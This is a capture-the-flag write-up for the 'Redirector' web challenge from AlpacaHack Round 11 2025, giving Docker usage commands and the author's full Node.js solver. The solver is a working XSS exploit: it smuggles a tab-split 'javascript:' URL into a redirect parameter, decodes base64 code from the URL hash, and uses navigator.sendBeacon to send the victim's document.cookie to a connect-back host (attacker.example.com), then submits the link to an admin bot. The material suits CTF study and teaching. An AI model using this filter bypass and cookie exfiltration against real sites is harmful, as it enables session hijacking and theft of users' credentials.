---
title: "Redirector - AlpacaHack Round 11 2025"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "redirector", "web", "alpacahack-round-11"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/redirector"
license: "none stated"
ctf:
  name: "AlpacaHack Round 11"
  year: 2025
  challenge: "Redirector"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/redirector>
- **CTF:** AlpacaHack Round 11 2025

---

# [web] Redirector

## Description

It's just a redirector.

## Attachments

- [redirector](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/redirector/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const url = new URL("http://redirector:3000");
url.searchParams.set(
  "next",
  `javascrip\tt:with(navigation)with(currentEntry)with(url)setTimeout(atob(slice(___)))`
);
const hashIndex = url.href.length + 1;
url.searchParams.set(
  "next",
  url.searchParams
    .get("next")
    .replace("___", hashIndex.toString().padStart(3, " "))
);
url.hash = btoa(`navigator.sendBeacon("${CONNECTBACK_URL}", document.cookie);`);

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3_000);
  await reportUrl(url);

  await sleep(3_000);
  assert.fail("Failed");
});
```
